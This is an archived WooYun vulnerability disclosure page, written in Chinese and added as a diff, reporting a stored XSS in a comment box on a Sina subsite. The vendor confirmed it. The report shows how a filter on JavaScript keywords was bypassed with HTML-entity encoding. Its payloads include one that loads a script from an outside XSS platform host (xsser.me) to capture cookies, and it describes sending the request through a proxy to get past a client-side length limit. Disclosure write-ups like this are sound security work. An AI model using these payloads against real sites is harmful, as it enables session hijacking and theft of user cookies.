@@ -1,0 +1,234 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪某分站储存xss（一）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪某分站储存xss（一）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/px1624">px1624</a> 
+</li><li>提交时间：		2013-04-24 11:21</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-24：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-04-24：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-04：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-14：	细节向普通白帽子公开<br/>
+									2013-05-24：	细节向实习白帽子公开<br/>
+									2013-06-08：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">其实开始是在人人网找的，点着点着就点到新浪了，然后就发现了这个漏洞额。位置过滤了所有的js代码，比如你输入的内容含有个alert(1)，那么所有内容就被过滤成了空字符。。。第一次遇到这种奇怪的过滤逻辑，不过我还是给绕过了，嘎嘎~</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">测试地址 ：</p><pre><code>http://lining.sina.com.cn/irun/spot/runmap_detail.php?runid=221</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+1 位置在上面的地址的，评论框。 <br />
+<br />
+<br />
+<br />
+2 虽然没有过滤&gt;&lt;&quot; 但是过滤了 \ 和所有的直接输出的js代码。 比如输入alert(1) 就会过滤掉，而且测试是只要你输入的内容中含有js代码，那么就悲剧了。输入个var 也会悲剧掉、、<br />
+<br />
+<br />
+<br />
+我上面说的那个情况是直接在评论框输入js代码，不含其他html标签。当然你含有了html标签，也是一样的结果。<br />
+<br />
+<br />
+<br />
+3 试了试没有过滤&amp;#，然后将含有js代码的位置转换了一下。<br />
+<br />
+<br />
+<br />
+比如我要插入</p><pre><code>&lt;img src=1 onerror=alert(1)&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这里就转换为 </p><pre><code>&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4 转换后插个alert(1)进去试试，果然弹窗了。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/22190828264f3a8d8041ec36be93e99370ab9828.png" target="_blank"><img src="../images/22190828264f3a8d8041ec36be93e99370ab9828.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5 然后按照4的方法，试着去插一下外部调用js文件的代码。由于网站有用到jq（F12搜索jq，可以搜到调用jq的代码），所以我直接用<br />
+<br />
+</p><pre><code>&lt;img src=1 onerror=&quot;jQuery.getScript(&#039;//xsser.me/4310VB&#039;)&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+转换后就是</p><pre><code>&amp;#106;&amp;#81;&amp;#117;&amp;#101;&amp;#114;&amp;#121;&amp;#46;&amp;#103;&amp;#101;&amp;#116;&amp;#83;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#40;&amp;#39;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#101;&amp;#114;&amp;#46;&amp;#109;&amp;#101;&amp;#47;&amp;#52;&amp;#51;&amp;#49;&amp;#48;&amp;#86;&amp;#66;&amp;#39;&amp;#41;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+6 提交，竟然提交失败，限制了长度为140字符。<br />
+<br />
+<br />
+<br />
+7 gainover之前有讲过，前端限制压根就不算限制。所以我用charles去发包提交了下，果然只是前端限制。。。成功提交了xss代码。然后F12去网页看一下，成功插入。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2219204689211856d7b3a6702c2303a9747162bd.png" target="_blank"><img src="../images/2219204689211856d7b3a6702c2303a9747162bd.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8 光插入代码，不足以服人额，下面是抓到的cookie的图、<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/221913510f747c43a176538d59e6da8d9411afe2.png" target="_blank"><img src="../images/221913510f747c43a176538d59e6da8d9411afe2.png" alt="3.png" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">如上。<br />
+<br />
+<br />
+<br />
+测试可以影响sina.com.cn下的所有产品、 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1 过滤下&gt;&lt;&quot;&amp;#等特殊字符。<br />
+<br />
+<br />
+<br />
+2 能告诉我你们那里过滤js代码的用以是什么吗？ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/px1624" title="px1624">px1624</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-022315" title="新浪某分站储存xss（一）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2013-04-24 11:27</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢 帽帽 px1624，已安排人员进行处理。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="22315";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
